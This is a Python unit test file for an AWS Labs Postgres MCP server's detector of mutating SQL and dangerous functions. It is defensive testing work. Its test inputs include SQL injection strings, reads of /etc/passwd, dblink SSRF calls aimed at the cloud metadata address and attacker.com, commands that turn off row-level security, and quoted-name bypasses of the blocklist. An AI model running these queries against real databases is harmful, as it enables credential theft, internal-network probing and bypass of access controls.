# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Unit tests for the mutating-SQL keyword detector and dangerous-function check.

These tests cover the security additions documented in the module's
comments: session-state mutation keywords (SET, RESET, DISCARD, LOAD),
anonymous code execution (DO), the IMPORT FOREIGN SCHEMA missing-comma
fix, and the dangerous-function blocklist.
"""

import pytest
from awslabs.postgres_mcp_server.mutable_sql_detector import (
    DANGEROUS_FUNCTIONS,
    MUTATING_KEYWORDS,
    SECURITY_SENSITIVE_GUCS,
    check_sql_injection_risk,
    detect_mutating_keywords,
    normalize_for_detection,
    strip_quoted_identifiers,
    strip_sql_comments,
)


class TestAllMutatingKeywords:
    """Every entry in MUTATING_KEYWORDS must be detected.

    These are the verbs rejected when readonly_query is True. The
    data-driven test iterates the actual set so any future addition is
    automatically covered; the explicit-SQL test documents real attack
    inputs for the common DML/DDL verbs.
    """

    @pytest.mark.parametrize('keyword', sorted(MUTATING_KEYWORDS))
    def test_every_keyword_detected(self, keyword):
        """Each keyword in the set is matched by the detector.

        Detection is a word-boundary regex match, so embedding the
        keyword in a minimal statement is sufficient and works for
        multi-word entries (e.g. 'IMPORT FOREIGN SCHEMA') too.
        """
        sql = f'{keyword} something_follows'
        matches = detect_mutating_keywords(sql)
        assert keyword in matches, f'{keyword!r} not detected in {sql!r}, got {matches}'

    @pytest.mark.parametrize(
        'sql,expected_keyword',
        [
            ('INSERT INTO t (a) VALUES (1)', 'INSERT'),
            ('UPDATE t SET a = 1 WHERE id = 2', 'UPDATE'),
            ('DELETE FROM t WHERE id = 1', 'DELETE'),
            ('MERGE INTO t USING s ON t.id = s.id', 'MERGE'),
            ('TRUNCATE TABLE t', 'TRUNCATE'),
            ("COPY t FROM '/tmp/x.csv'", 'COPY'),
            ('LISTEN my_channel', 'LISTEN'),
            ('LOCK TABLE t IN EXCLUSIVE MODE', 'LOCK'),
            ("NOTIFY my_channel, 'payload'", 'NOTIFY'),
            ('REFRESH MATERIALIZED VIEW mv', 'REFRESH'),
            ('PREPARE stmt AS SELECT 1', 'PREPARE'),
            ('CREATE TABLE t (id int)', 'CREATE'),
            ('DROP TABLE t', 'DROP'),
            ('ALTER TABLE t ADD COLUMN c int', 'ALTER'),
            ('ALTER TABLE t RENAME TO t2', 'RENAME'),
            ('GRANT SELECT ON t TO bob', 'GRANT'),
            ('REVOKE SELECT ON t FROM bob', 'REVOKE'),
            ("COMMENT ON TABLE t IS 'x'", 'COMMENT ON'),
            ("SECURITY LABEL ON TABLE t IS 'x'", 'SECURITY LABEL'),
            ('CREATE EXTENSION pg_stat_statements', 'CREATE EXTENSION'),
            ('CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql', 'CREATE FUNCTION'),
            ('INSTALL some_thing', 'INSTALL'),
            ('CALL my_procedure()', 'CALL'),
            ('EXECUTE stmt', 'EXECUTE'),
            ('CLUSTER t USING t_idx', 'CLUSTER'),
            ('REINDEX TABLE t', 'REINDEX'),
            ('VACUUM FULL t', 'VACUUM'),
            ('ANALYZE t', 'ANALYZE'),
            ('SET search_path TO x', 'SET'),
            ('RESET ALL', 'RESET'),
            ('DISCARD ALL', 'DISCARD'),
            ("LOAD 'auto_explain'", 'LOAD'),
            ('DO $$ BEGIN PERFORM 1; END $$', 'DO'),
            (
                'IMPORT FOREIGN SCHEMA public FROM SERVER s INTO local',
                'IMPORT FOREIGN SCHEMA',
            ),
        ],
    )
    def test_representative_sql_detected(self, sql, expected_keyword):
        """Realistic statements for each verb are detected."""
        matches = detect_mutating_keywords(sql)
        assert expected_keyword in matches, f'expected {expected_keyword} in {matches} for {sql!r}'

    def test_benign_select_has_no_mutating_keyword(self):
        """A plain SELECT must not match any mutating keyword."""
        assert detect_mutating_keywords('SELECT id, name FROM users WHERE id = 1') == []


class TestSuspiciousPatterns:
    """check_sql_injection_risk's SUSPICIOUS_PATTERNS catch injection shapes.

    These run in both read and write mode. Each representative input
    must produce at least one issue. Note that pg_sleep is now caught
    earlier by the dangerous-function check; the bare sleep( pattern
    still exercises the suspicious-pattern path.
    """

    @pytest.mark.parametrize(
        'sql',
        [
            # comment injection
            "SELECT * FROM t WHERE name = '' OR ''='' --",
            # numeric tautology OR 1=1
            'SELECT * FROM t WHERE id = 1 OR 1=1',
            # string tautology OR 'a'='a'
            "SELECT * FROM t WHERE name = 'x' OR 'a'='a'",
            # UNION SELECT
            'SELECT a FROM t UNION SELECT password FROM users',
            # DROP
            'DROP TABLE t',
            # TRUNCATE
            'TRUNCATE TABLE t',
            # GRANT / REVOKE
            'GRANT SELECT ON t TO bob',
            'REVOKE SELECT ON t FROM bob',
            # stacked queries
            'SELECT 1; SELECT 2',
            # delay-based probe (bare sleep, not pg_sleep)
            'SELECT sleep(5)',
            # MySQL-ism file read primitive
            "SELECT load_file('/etc/passwd')",
            # MySQL-ism file write
            "SELECT * INTO OUTFILE '/tmp/x' FROM t",
        ],
    )
    def test_suspicious_pattern_flagged(self, sql):
        """Each suspicious-pattern shape produces at least one issue."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) >= 1, f'expected an issue for {sql!r}'
        assert issues[0]['severity'] == 'high'

    def test_clean_query_has_no_issue(self):
        """A parameterized-style clean query produces no issue."""
        assert check_sql_injection_risk('SELECT id, name FROM users WHERE id = 1') == []


class TestSessionStateKeywords:
    """SET / RESET / DISCARD / LOAD mutate session state on the connection.

    Even though they don't mutate rows, they alter the session context
    for every subsequent query on a pooled connection, which can poison
    later queries the agent issues.
    """

    @pytest.mark.parametrize(
        'sql,expected_keyword',
        [
            ('SET search_path TO public, attacker_schema', 'SET'),
            ("set statement_timeout = '0'", 'SET'),
            ('RESET ALL', 'RESET'),
            ('reset session_replication_role', 'RESET'),
            ('DISCARD ALL', 'DISCARD'),
            ('discard temp', 'DISCARD'),
            ("LOAD '/tmp/lib.so'", 'LOAD'),
            ("load 'auto_explain'", 'LOAD'),
        ],
    )
    def test_session_state_keyword_detected(self, sql, expected_keyword):
        """Each session-state verb is in the mutating-keyword set."""
        matches = detect_mutating_keywords(sql)
        assert expected_keyword in matches, (
            f'expected {expected_keyword} for {sql!r}, got {matches}'
        )

    def test_select_with_similar_word_not_flagged(self):
        """Word-boundary regex avoids false positives on identifiers."""
        # Names that contain the keyword as a substring should not match.
        assert detect_mutating_keywords('SELECT * FROM resets WHERE id = 1') == []
        assert detect_mutating_keywords('SELECT load_balancer FROM cfg') == []
        assert detect_mutating_keywords('SELECT discarded_at FROM events') == []


class TestDoBlock:
    """DO $$ ... $$ runs PL/pgSQL even inside read-only transactions.

    Procedural side effects (pg_sleep loops, RAISE, PERFORM SECURITY
    DEFINER funcs) execute regardless of the read-only constraint.
    """

    @pytest.mark.parametrize(
        'sql',
        [
            'DO $$ BEGIN PERFORM 1; END $$',
            'do $$ begin perform pg_sleep(10); end $$',
            "DO LANGUAGE plpgsql $$ BEGIN RAISE NOTICE 'x'; END $$",
            # Mixed leading whitespace
            '   DO $$ BEGIN END $$',
        ],
    )
    def test_do_block_detected(self, sql):
        """DO is detected regardless of casing or surrounding whitespace."""
        assert 'DO' in detect_mutating_keywords(sql)

    def test_identifiers_starting_with_do_not_flagged(self):
        """Word boundaries keep 'do_thing' / 'done_things' from matching DO."""
        assert detect_mutating_keywords('SELECT do_not_match(1)') == []
        assert detect_mutating_keywords('SELECT * FROM done_things') == []


class TestImportForeignSchemaCommaFix:
    """Regression test for the IMPORT FOREIGN SCHEMA missing-comma bug.

    A missing trailing comma silently merged ``'IMPORT FOREIGN SCHEMA'``
    with the next entry into one string, so neither IMPORT FOREIGN
    SCHEMA nor the merged-into entry matched on its own. Both must now
    match independently.
    """

    def test_import_foreign_schema_detected(self):
        """IMPORT FOREIGN SCHEMA is matched as a single multi-word keyword."""
        sql = 'IMPORT FOREIGN SCHEMA public LIMIT TO (t1) FROM SERVER fs INTO local_schema'
        matches = detect_mutating_keywords(sql)
        assert 'IMPORT FOREIGN SCHEMA' in matches

    def test_grant_still_detected_independently(self):
        """GRANT matches on its own even though it followed the broken entry."""
        # Pre-fix the merged 'IMPORT FOREIGN SCHEMAGRANT' meant GRANT
        # also failed to match. Confirm GRANT works on its own.
        matches = detect_mutating_keywords('GRANT SELECT ON tbl TO bob')
        assert 'GRANT' in matches

    def test_revoke_still_detected_independently(self):
        """REVOKE matches on its own."""
        matches = detect_mutating_keywords('REVOKE SELECT ON tbl FROM bob')
        assert 'REVOKE' in matches


class TestDangerousFunctions:
    """Functions that are dangerous regardless of read/write mode.

    These fire from check_sql_injection_risk so they're rejected even
    when readonly_query is False.
    """

    @pytest.mark.parametrize(
        'sql,expected_function',
        [
            ('SELECT pg_cancel_backend(99999)', 'pg_cancel_backend'),
            ('SELECT pg_terminate_backend(123)', 'pg_terminate_backend'),
            ('select pg_sleep(10)', 'pg_sleep'),
            ("SELECT pg_sleep_for(interval '1 second')", 'pg_sleep_for'),
            ("SELECT pg_sleep_until(now() + interval '1 minute')", 'pg_sleep_until'),
            ("SELECT pg_read_file('/etc/passwd')", 'pg_read_file'),
            ("SELECT pg_read_binary_file('/etc/passwd', 0, 100)", 'pg_read_binary_file'),
            ("SELECT * FROM pg_ls_dir('pg_log')", 'pg_ls_dir'),
            ("SELECT pg_stat_file('pg_log/postgresql.log')", 'pg_stat_file'),
            ("SELECT lo_import('/tmp/x')", 'lo_import'),
            ("SELECT lo_export(0, '/tmp/x')", 'lo_export'),
            ('SELECT pg_reload_conf()', 'pg_reload_conf'),
            ('SELECT pg_rotate_logfile()', 'pg_rotate_logfile'),
            # Advisory-lock family (Class L). Each variant must match
            # because each one independently allows an attacker to
            # acquire an application coordination lock.
            ('SELECT pg_advisory_lock(42)', 'pg_advisory_lock'),
            ('SELECT pg_advisory_lock_shared(42)', 'pg_advisory_lock_shared'),
            ('SELECT pg_advisory_xact_lock(42)', 'pg_advisory_xact_lock'),
            ('SELECT pg_advisory_xact_lock_shared(42)', 'pg_advisory_xact_lock_shared'),
            ('SELECT pg_try_advisory_lock(42)', 'pg_try_advisory_lock'),
            ('SELECT pg_try_advisory_lock_shared(42)', 'pg_try_advisory_lock_shared'),
            ('SELECT pg_try_advisory_xact_lock(42)', 'pg_try_advisory_xact_lock'),
            (
                'SELECT pg_try_advisory_xact_lock_shared(42)',
                'pg_try_advisory_xact_lock_shared',
            ),
            # NOTIFY-channel side-channel.
            ("SELECT pg_notify('ch', 'payload')", 'pg_notify'),
        ],
    )
    def test_each_dangerous_function_rejected(self, sql, expected_function):
        """Each dangerous function in the blocklist is rejected with a named reason."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert issues[0]['type'] == 'sql'
        assert issues[0]['severity'] == 'high'
        # The rejection message should name the specific function so
        # the operator can see what was blocked.
        assert expected_function in issues[0]['message']

    def test_advisory_lock_prefix_overlap_resolved_correctly(self):
        """pg_advisory_lock and pg_advisory_lock_shared are prefix-overlapping.

        The regex must report the longer name when the input is the
        longer one. If the shorter name's alternative wins, the
        operator gets a misleading rejection reason and a
        downstream test that checks 'pg_advisory_lock_shared' in the
        message would silently fail.
        """
        for short_name, long_name in [
            ('pg_advisory_lock', 'pg_advisory_lock_shared'),
            ('pg_advisory_xact_lock', 'pg_advisory_xact_lock_shared'),
            ('pg_try_advisory_lock', 'pg_try_advisory_lock_shared'),
            ('pg_try_advisory_xact_lock', 'pg_try_advisory_xact_lock_shared'),
        ]:
            issues = check_sql_injection_risk(f'SELECT {long_name}(42)')
            assert len(issues) == 1
            # The longer name must appear; the shorter is also a substring
            # of the message but only because it's a substring of the
            # longer name. Check by structural assertion: the short name
            # alone must not be the only thing the regex captured.
            assert long_name in issues[0]['message'], (
                f'expected {long_name} in message, got {issues[0]["message"]!r}'
            )
            # And, just to be explicit: a query for the short name
            # alone resolves to the short name.
            short_issues = check_sql_injection_risk(f'SELECT {short_name}(42)')
            assert short_name in short_issues[0]['message']
            assert long_name not in short_issues[0]['message']

    def test_schema_qualified_call_rejected(self):
        """Schema-qualified calls (pg_catalog.pg_terminate_backend) match."""
        issues = check_sql_injection_risk('SELECT pg_catalog.pg_terminate_backend(123)')
        assert len(issues) == 1
        assert 'pg_terminate_backend' in issues[0]['message']

    def test_uppercase_function_call_rejected(self):
        """Uppercase / mixed-case spellings are still detected.

        Postgres folds unquoted identifiers to lowercase, but our regex
        must still match the upper-case spellings an LLM might emit.
        """
        issues = check_sql_injection_risk('SELECT PG_TERMINATE_BACKEND(123)')
        assert len(issues) == 1

    def test_dangerous_function_message_explains_why(self):
        """The rejection message names the function and the reason category.

        Operator readability matters — the message shouldn't just say
        'suspicious'. It must identify which function was blocked and
        why so the operator can decide whether to allow it via role
        permissions instead.
        """
        issues = check_sql_injection_risk('SELECT pg_terminate_backend(1)')
        msg = issues[0]['message']
        assert 'pg_terminate_backend' in msg
        # Mentions the impact category so the operator understands the
        # block isn't arbitrary.
        assert 'cluster-wide side effects' in msg or 'DoS' in msg

    @pytest.mark.parametrize(
        'sql',
        [
            # Identifier coincidentally containing the function name
            'SELECT my_pg_sleep_helper(10)',
            'SELECT * FROM pg_terminate_backend_audit',
            # Function name without a call (no opening paren)
            'SELECT pg_terminate_backend',
            # Referenced as a string literal, not a call
            "SELECT 'pg_terminate_backend' AS name",
        ],
    )
    def test_false_positive_avoidance(self, sql):
        """Word-boundary + open-paren requirement avoids false positives."""
        # check_sql_injection_risk may flag these via OTHER patterns
        # (e.g. comment injection), but the dangerous-function check
        # specifically must not fire. Easiest assertion: if there's an
        # issue, its message must NOT mention "Dangerous function".
        issues = check_sql_injection_risk(sql)
        for issue in issues:
            assert 'Dangerous function call' not in issue['message'], (
                f'unexpected dangerous-function rejection for {sql!r}'
            )

    def test_dangerous_functions_list_is_non_empty(self):
        """Sanity check that the blocklist hasn't been emptied accidentally."""
        # 13 originals + 8 advisory + 1 pg_notify + 9 dblink = 31.
        assert len(DANGEROUS_FUNCTIONS) >= 31
        # The two specifically called out in the threat model must be
        # present; treat their absence as a regression.
        assert 'pg_cancel_backend' in DANGEROUS_FUNCTIONS
        assert 'pg_terminate_backend' in DANGEROUS_FUNCTIONS
        # Advisory-lock family — Class L threat model.
        assert 'pg_advisory_lock' in DANGEROUS_FUNCTIONS
        assert 'pg_advisory_xact_lock' in DANGEROUS_FUNCTIONS
        assert 'pg_try_advisory_xact_lock_shared' in DANGEROUS_FUNCTIONS
        # dblink family — SSRF.
        assert 'dblink' in DANGEROUS_FUNCTIONS
        assert 'dblink_connect' in DANGEROUS_FUNCTIONS
        assert 'dblink_connect_u' in DANGEROUS_FUNCTIONS

    def test_safe_select_passes(self):
        """Confirm a benign SELECT yields no issues."""
        assert check_sql_injection_risk('SELECT id, name FROM users WHERE id = 1') == []


class TestDblinkSsrf:
    """dblink family functions are SSRF primitives.

    These open outbound TCP connections from the database backend to an
    arbitrary host:port. Before the fix they passed both gates
    (detect_mutating_keywords and check_sql_injection_risk) and ran even
    in read-only mode, allowing IMDS credential theft, internal-network
    probing, and data exfiltration. They must now be rejected by the
    dangerous-function check regardless of read/write mode.
    """

    @pytest.mark.parametrize(
        'sql,expected_function',
        [
            # Open a raw connection — the core SSRF primitive.
            (
                "SELECT dblink_connect('host=10.0.0.1 port=6379 dbname=x connect_timeout=5')",
                'dblink_connect',
            ),
            # IMDS credential-theft vector.
            (
                "SELECT dblink_connect('host=169.254.169.254 port=80 "
                "dbname=latest/meta-data/iam/ connect_timeout=5')",
                'dblink_connect',
            ),
            # Unprivileged-auth variant — must match the longer name, not
            # the dblink_connect prefix.
            (
                "SELECT dblink_connect_u('host=attacker.com port=5432 dbname=x')",
                'dblink_connect_u',
            ),
            # Connect-and-read in a single call.
            (
                "SELECT * FROM dblink('host=redis.internal port=6379 dbname=0', "
                "'SELECT 1') AS t(r text)",
                'dblink',
            ),
            (
                "SELECT dblink_exec('conn', 'CREATE TABLE stolen(data text)')",
                'dblink_exec',
            ),
            ("SELECT dblink_send_query('conn', 'SELECT 1')", 'dblink_send_query'),
            ("SELECT dblink_open('conn', 'cur', 'SELECT 1')", 'dblink_open'),
            ("SELECT dblink_fetch('conn', 'cur', 1)", 'dblink_fetch'),
            ("SELECT dblink_close('conn', 'cur')", 'dblink_close'),
            ('SELECT dblink_get_connections()', 'dblink_get_connections'),
        ],
    )
    def test_dblink_function_rejected(self, sql, expected_function):
        """Each dblink call site is rejected with a named reason."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert issues[0]['type'] == 'sql'
        assert issues[0]['severity'] == 'high'
        assert expected_function in issues[0]['message']

    def test_schema_qualified_dblink_rejected(self):
        """Schema-qualified calls (public.dblink_connect) match."""
        issues = check_sql_injection_risk(
            "SELECT public.dblink_connect('host=10.0.0.1 port=22 dbname=x')"
        )
        assert len(issues) == 1
        assert 'dblink_connect' in issues[0]['message']

    def test_uppercase_dblink_rejected(self):
        """Uppercase spellings an LLM might emit are still detected."""
        issues = check_sql_injection_risk(
            "SELECT DBLINK_CONNECT('host=169.254.169.254 port=80 dbname=x')"
        )
        assert len(issues) == 1
        assert 'dblink_connect' in issues[0]['message'].lower()

    def test_connect_u_resolves_to_longer_name(self):
        """dblink_connect_u must report itself, not the dblink_connect prefix.

        The two names are prefix-overlapping; the length-sorted
        alternation must make the longer one win so the operator sees
        the accurate function name.
        """
        issues = check_sql_injection_risk("SELECT dblink_connect_u('host=x port=5432 dbname=y')")
        assert 'dblink_connect_u' in issues[0]['message']

    def test_dblink_column_name_not_flagged(self):
        """A column or identifier merely containing 'dblink' is not a call."""
        issues = check_sql_injection_risk('SELECT dblink_status FROM connection_log')
        for issue in issues:
            assert 'Dangerous function call' not in issue['message']


class TestSecuritySensitiveGucs:
    """SET row_security / session_replication_role disable access controls.

    Unlike generic SET (which is only blocked in read-only mode via the
    mutating-keyword path), these two GUCs are rejected from
    check_sql_injection_risk so they're blocked even when the server
    runs with writes enabled — setting them silently weakens RLS or
    trigger-based integrity for every subsequent query on the
    connection.
    """

    @pytest.mark.parametrize(
        'sql,expected_guc',
        [
            ('SET row_security = off', 'row_security'),
            ('SET row_security TO off', 'row_security'),
            ('set session row_security = off', 'row_security'),
            ('SET LOCAL row_security = off', 'row_security'),
            ('SET session_replication_role = replica', 'session_replication_role'),
            ('set session_replication_role to replica', 'session_replication_role'),
            (
                'SET SESSION session_replication_role = replica',
                'session_replication_role',
            ),
        ],
    )
    def test_security_guc_rejected(self, sql, expected_guc):
        """Each security-sensitive GUC is rejected with a named reason."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert issues[0]['type'] == 'sql'
        assert issues[0]['severity'] == 'high'
        assert expected_guc in issues[0]['message']

    def test_benign_guc_not_flagged_by_security_check(self):
        """A non-sensitive SET is not caught by the security-GUC check.

        It may still be blocked in read-only mode by the mutating-keyword
        path, but check_sql_injection_risk (which runs in both modes)
        must not reject an ordinary GUC like statement_timeout.
        """
        issues = check_sql_injection_risk('SET statement_timeout = 0')
        for issue in issues:
            assert 'Security-sensitive session setting' not in issue['message']

    def test_guc_name_as_column_not_flagged(self):
        """Reading a column named row_security is not a SET and is allowed."""
        issues = check_sql_injection_risk('SELECT row_security FROM cfg')
        for issue in issues:
            assert 'Security-sensitive session setting' not in issue['message']

    def test_security_guc_set_is_mode_independent(self):
        """A security GUC is rejected by the mode-independent check.

        The check lives in check_sql_injection_risk, not the readonly
        path, so it doesn't depend on readonly_query. This asserts the
        function-level contract: a security GUC is always rejected.
        """
        # Both calls go through the same mode-independent function.
        assert check_sql_injection_risk('SET row_security = off')
        assert check_sql_injection_risk('SET session_replication_role = replica')

    def test_security_sensitive_guc_set_contents(self):
        """Sanity check the GUC set has exactly the two intended entries."""
        assert SECURITY_SENSITIVE_GUCS == {'row_security', 'session_replication_role'}


class TestSetConfigBypass:
    """set_config() is the function form of SET and must be gated too.

    Regression: SET row_security = off is gated, but the
    equivalent set_config('row_security','off',false) previously passed
    every check and ran even in read-only mode, disabling RLS and
    breaking multi-tenant isolation.

    The fix mirrors how SET itself is treated, giving two tiers:
      - The two security-critical GUCs (row_security,
        session_replication_role) are rejected in BOTH modes by
        SECURITY_SET_CONFIG_PATTERN inside check_sql_injection_risk.
      - Any other set_config target is treated like the SET keyword:
        blocked in read-only mode via the SET_CONFIG mutating keyword,
        but permitted in write mode (e.g. set_config('app.tenant_id',...)).
    """

    @pytest.mark.parametrize(
        'sql,expected_guc',
        [
            ("SELECT set_config('row_security', 'off', false)", 'row_security'),
            ("SELECT set_config('row_security','off',true)", 'row_security'),
            (
                "SELECT set_config('session_replication_role', 'replica', false)",
                'session_replication_role',
            ),
            # Schema-qualified call.
            (
                "SELECT pg_catalog.set_config('row_security','off',false)",
                'row_security',
            ),
            # Double-quoted function NAME (the quoted-identifier bypass);
            # the GUC arg stays single-quoted as valid SQL requires.
            (
                "SELECT \"set_config\"('row_security','off',false)",
                'row_security',
            ),
            # Extra whitespace.
            ("SELECT set_config ( 'row_security' , 'off' , false )", 'row_security'),
        ],
    )
    def test_security_guc_via_set_config_rejected_both_modes(self, sql, expected_guc):
        """set_config targeting a security GUC is rejected mode-independently.

        check_sql_injection_risk runs in both read and write mode, so a
        non-empty result here proves the rejection holds even when the
        server is write-enabled.
        """
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert issues[0]['severity'] == 'high'
        assert expected_guc in issues[0]['message']
        assert 'Security-sensitive session setting' in issues[0]['message']

    def test_security_guc_via_set_config_uppercase(self):
        """Uppercase SET_CONFIG spelling targeting a security GUC is rejected."""
        issues = check_sql_injection_risk("SELECT SET_CONFIG('row_security','off',false)")
        assert len(issues) == 1
        assert 'row_security' in issues[0]['message']

    @pytest.mark.parametrize(
        'sql',
        [
            # Secondary vectors from the report. These are NOT security GUCs,
            # so they are allowed in write mode but blocked in read-only mode
            # (set_config behaves like SET).
            "SELECT set_config('log_statement', 'none', false)",
            "SELECT set_config('log_min_messages', 'panic', false)",
            "SELECT set_config('statement_timeout', '0', false)",
            "SELECT set_config('search_path', 'attacker_schema,public', false)",
            # A benign session-context set in write mode.
            "SELECT set_config('app.tenant_id', '42', false)",
        ],
    )
    def test_non_security_set_config_blocked_in_readonly_only(self, sql):
        """Non-security set_config is a read-only-mode block, not mode-independent.

        It must be caught by the mutating-keyword gate (read-only mode)
        but NOT by check_sql_injection_risk (which runs in both modes),
        so a write-enabled server still permits it.
        """
        # Read-only gate catches it (SET_CONFIG mutating keyword).
        assert 'SET_CONFIG' in detect_mutating_keywords(sql)
        # Always-on gate does not, so write mode allows it.
        assert check_sql_injection_risk(sql) == []

    def test_set_config_not_in_dangerous_functions(self):
        """set_config is intentionally NOT an unconditional dangerous function.

        It is gated via the read-only mutating-keyword path plus the
        security-GUC pattern, so a write-enabled server can still use it
        for ordinary GUCs. Guards against a regression that would
        re-block it in both modes.
        """
        assert 'set_config' not in DANGEROUS_FUNCTIONS

    def test_set_config_keyword_blocks_in_readonly(self):
        """The SET_CONFIG mutating keyword fires for any set_config call."""
        assert 'SET_CONFIG' in detect_mutating_keywords(
            "SELECT set_config('row_security','off',false)"
        )

    @pytest.mark.parametrize(
        'sql',
        [
            # Identifier merely containing set_config as a substring.
            'SELECT set_configuration FROM cfg',
            # current_setting (read) is a different, benign function.
            "SELECT current_setting('search_path')",
        ],
    )
    def test_set_config_false_positives(self, sql):
        """Benign look-alikes must not trip either set_config gate."""
        assert detect_mutating_keywords(sql) == []
        issues = check_sql_injection_risk(sql)
        for issue in issues:
            assert 'set_config' not in issue['message']
            assert 'Security-sensitive session setting' not in issue['message']


class TestQuotedIdentifierBypass:
    """Double-quoted identifiers must not bypass the function / GUC checks.

    Regression. PostgreSQL treats "pg_sleep"(1) as identical
    to pg_sleep(1), but the detection regexes anchor on word boundaries
    and a name-then-paren adjacency that the closing quote breaks, so the
    quoted spelling previously passed every check — neutralizing the
    entire DANGEROUS_FUNCTIONS blocklist and re-opening the dblink SSRF
    and set_config RLS bypass. strip_quoted_identifiers() folds the
    quotes off before matching so both spellings are caught.
    """

    @pytest.mark.parametrize(
        'sql,expected',
        [
            ('SELECT "pg_sleep"(3)', 'pg_sleep'),
            ('SELECT "pg_read_file"(\'/etc/passwd\')', 'pg_read_file'),
            ('SELECT "pg_read_binary_file"(\'/x\')', 'pg_read_binary_file'),
            ('SELECT "pg_ls_dir"(\'/etc\')', 'pg_ls_dir'),
            ('SELECT "pg_stat_file"(\'/etc/passwd\')', 'pg_stat_file'),
            ('SELECT "pg_terminate_backend"(123)', 'pg_terminate_backend'),
            ('SELECT "pg_cancel_backend"(123)', 'pg_cancel_backend'),
            ('SELECT "lo_export"(16384, \'/tmp/x\')', 'lo_export'),
            ('SELECT "lo_import"(\'/etc/passwd\')', 'lo_import'),
            ('SELECT "pg_reload_conf"()', 'pg_reload_conf'),
            ('SELECT "pg_advisory_lock"(1)', 'pg_advisory_lock'),
            ("SELECT \"pg_notify\"('c', 'm')", 'pg_notify'),
            # The functions added in earlier fixes must stay covered too.
            (
                'SELECT "dblink_connect"(\'host=169.254.169.254 port=80 dbname=x\')',
                'dblink_connect',
            ),
            # Whitespace between the closing quote and the paren.
            ('SELECT "pg_sleep" (3)', 'pg_sleep'),
            # No space before the opening quote (the " ends the SELECT
            # token, so this is a valid call) — must not merge tokens.
            ('SELECT"pg_sleep"(3)', 'pg_sleep'),
            ('SELECT"pg_read_file"(\'/etc/passwd\')', 'pg_read_file'),
            # Quoted schema qualifier as well as quoted function name.
            ('SELECT "pg_catalog"."pg_sleep"(3)', 'pg_sleep'),
        ],
    )
    def test_quoted_dangerous_function_rejected(self, sql, expected):
        """Each quoted dangerous-function call is rejected and names the function."""
        issues = check_sql_injection_risk(sql)
        assert len(issues) == 1
        assert issues[0]['severity'] == 'high'
        assert expected in issues[0]['message']

    def test_quoted_set_keyword_security_guc_rejected(self):
        """SET "row_security" = off (quoted GUC name) is still rejected."""
        issues = check_sql_injection_risk('SET "row_security" = off')
        assert len(issues) == 1
        assert 'row_security' in issues[0]['message']

    def test_quoted_set_config_function_rejected(self):
        """A double-quoted set_config name targeting a security GUC is rejected."""
        issues = check_sql_injection_risk("SELECT \"set_config\"('row_security','off',false)")
        assert len(issues) == 1
        assert 'row_security' in issues[0]['message']

    def test_unquoted_calls_still_rejected(self):
        """The normalization must not regress the ordinary unquoted path."""
        assert check_sql_injection_risk('SELECT pg_sleep(3)')
        assert check_sql_injection_risk("SELECT pg_read_file('/etc/passwd')")

    @pytest.mark.parametrize(
        'sql',
        [
            # Reserved words used as quoted identifiers — a legitimate,
            # common pattern that must keep working.
            'SELECT "user", "order" FROM "select" WHERE id = 1',
            # A column merely named like a dangerous function (no call).
            'SELECT "pg_read_file" FROM cfg',
            # Table name that embeds a function name as a substring.
            'SELECT * FROM "pg_sleep_log"',
            # Identifier with a space cannot spell a blocklisted name and
            # is left alone (not a \\w+ match).
            'SELECT "first name" FROM people',
        ],
    )
    def test_benign_quoted_identifiers_allowed(self, sql):
        """Legitimate quoted identifiers must not be flagged."""
        assert check_sql_injection_risk(sql) == []

    @pytest.mark.parametrize(
        'sql,expected_keyword',
        [
            ('"INSERT" INTO t VALUES (1)', 'INSERT'),
            ('"UPDATE" t SET a = 1', 'UPDATE'),
            ('"DELETE" FROM t', 'DELETE'),
            ('"DROP" TABLE t', 'DROP'),
            ('"CREATE" TABLE t (id int)', 'CREATE'),
            ("\"set_config\"('search_path', 'x', false)", 'SET_CONFIG'),
        ],
    )
    def test_quoted_mutation_keyword_still_detected(self, sql, expected_keyword):
        """Quoting a mutating keyword does not evade the read-only gate.

        detect_mutating_keywords runs on the raw SQL and its word-boundary
        anchors match at the quote characters, so "INSERT"/"DROP"/etc. are
        still detected. (Quoting a DML/DDL keyword also turns it into an
        identifier, so it is no longer a real mutation — but blocking it is
        the safe direction.) This is the read-only-mode gate, distinct from
        the quoted-function bypass the rest of this class covers.
        """
        assert expected_keyword in detect_mutating_keywords(sql)

    def test_quoted_drop_also_flagged_by_injection_check(self):
        """DROP additionally trips the always-on suspicious-pattern check.

        The bare drop suspicious pattern matches the quoted spelling too,
        so a write-mode server still rejects "DROP" TABLE.
        """
        assert check_sql_injection_risk('"DROP" TABLE t')


class TestStripQuotedIdentifiers:
    """Unit coverage for the strip_quoted_identifiers() normalization helper."""

    @pytest.mark.parametrize(
        'raw,expected',
        [
            ('SELECT "pg_sleep"(1)', 'SELECT pg_sleep (1)'),
            # No space before the quote: the bare name must NOT merge into
            # the preceding keyword (regression for the token-merge bypass).
            ('SELECT"pg_sleep"(1)', 'SELECT pg_sleep (1)'),
            ('"pg_catalog"."pg_sleep"', 'pg_catalog . pg_sleep'),
            ('SET "row_security" = off', 'SET row_security = off'),
            ('SET"row_security"=off', 'SET row_security =off'),
            # The substitution is lexical: a double-quoted word inside a
            # single-quoted literal is unwrapped too. Harmless (only
            # removes quote chars / adds spaces) and documented behaviour.
            ('SELECT \'a "quoted" word\'', "SELECT 'a quoted word'"),
            # Identifiers with non-word characters are left intact.
            ('SELECT "first name"', 'SELECT "first name"'),
            # No quotes — returned unchanged.
            ('SELECT pg_sleep(1)', 'SELECT pg_sleep(1)'),
        ],
    )
    def test_strip(self, raw, expected):
        """Double-quoted simple identifiers are unwrapped and space-padded.

        Compared with runs of whitespace collapsed: the helper pads the
        bare name with spaces to keep tokens from merging, and the exact
        number of spaces is not contractually significant (every pattern
        tolerates flexible whitespace).
        """
